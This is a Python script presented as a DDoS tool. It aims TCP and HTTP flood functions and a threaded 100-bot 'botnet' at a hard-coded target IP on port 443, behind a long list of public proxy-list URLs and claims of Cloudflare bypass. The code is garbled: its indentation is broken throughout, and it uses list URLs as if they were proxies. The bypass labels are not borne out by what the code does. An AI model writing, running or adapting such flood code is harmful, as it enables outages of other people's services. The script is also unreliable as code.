import socket
import threading
import random
import time
import requests
from scapy.all import *

# Configuration
target_ip = "172.67.139.92" # Replace with target IP
target_port = 443 # Replace with target port
botnet_size = 100 # Number of bots in the botnet
requests_per_second = 100 # Rate of requests per second per bot
proxy_list = [
   "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/proxies.txt",
    "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-List/main/proxies.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/userxd001/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks4.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks5.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
    "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt",
    "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://api.proxyscrape.com/?request=displayproxies&protocol=http",
    "https://proxyspace.pro/http.txt",
    "https://multiproxy.org/txt_all/proxy.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/Volodichev/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/Volodichev/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/Volodichev/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
    "https://raw.githubusercontent.com/roetsec/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/roetsec/proxy-list/master/socks4.txt",
    "https://raw.githubusercontent.com/roetsec/proxy-list/master/socks5.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt",
    "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks4_proxies.txt",
    "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks5_proxies.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks4/socks4.txt",
    "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt",
    "https://raw.githubusercontent.com/ProxyDown/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/ProxyDown/proxy-list/main/https.txt",
    "https://raw.githubusercontent.com/ProxyDown/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/ProxyDown/proxy-list/main/socks5.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/http/global/http_checked.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/https/global/https_checked.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt"
] # Replace with actual proxy list

# Function to get a random proxy
def get_random_proxy():
 return random.choice(proxy_list)

# Layer 4 (TCP) Attack with Proxy and Cloudflare Bypass
def tcp_flood_with_proxy_and_cf_bypass(target_ip, target_port, duration):
 proxy = get_random_proxy()
 proxies = {
 "http": proxy,
 "https": proxy,
 }
 while duration > 0:
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target_ip, target_port))
          s.sendto(("GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
           s.close()
             except Exception as e:
             print(f"TCP Flood Error: {e}")
              duration -= 1
              time.sleep(1 / requests_per_second)

# Layer 7 (HTTP) Attack with Proxy and Cloudflare Bypass
def http_flood_with_proxy_and_cf_bypass(target_ip, target_port, duration):
 proxy = get_random_proxy()
 proxies = {
 "http": proxy,
 "https": proxy,
 }
 while duration > 0:
     try:
         response = requests.get(f"http://{target_ip}:{target_port}/", proxies=proxies, timeout=5)
          if 'cloudflare' in response.text.lower():
            print("Cloudflare detected, rotating proxy...")
 proxy = get_random_proxy()
 proxies = {
 "http": proxy,
 "https": proxy,
 }
 except Exception as e:
                       print(f"HTTP Flood Error: {e}")
                       duration -= 1
                        time.sleep(1 / requests_per_second)

# C2C (Client to Client) Bypass with Proxy and Cloudflare Bypass
def c2c_bypass_with_proxy_and_cf_bypass(target_ip, target_port, duration):
 proxy = get_random_proxy()
 proxies = {
 "http": proxy,
 "https": proxy,
 }
 while duration > 0:
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((target_ip, target_port))
           s.sendto(("GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
            s.close()
 except Exception as e:
                      print(f"C2C Bypass Error: {e}")
                       duration -= 1
                        time.sleep(1 / requests_per_second)

# Botnet Simulation
def botnet_attack_with_proxy_and_cf_bypass(target_ip, target_port, botnet_size, duration):
 threads = []
 for _ in range(botnet_size):
 t = threading.Thread(target=tcp_flood_with_proxy_and_cf_bypass, args=(target_ip, target_port, duration))
 threads.append(t)
 t.start()

 for t in threads:
     t.join()

# Main Function
def main():
 duration = 60 # Duration of the attack in seconds
 print(f"Starting DDoS attack on {target_ip}:{target_port} for {duration} seconds with {botnet_size} bots.")
 botnet_attack_with_proxy_and_cf_bypass(target_ip, target_port, botnet_size, duration)
 print("DDoS attack completed.")

if __name__ == "__main__":
     main()
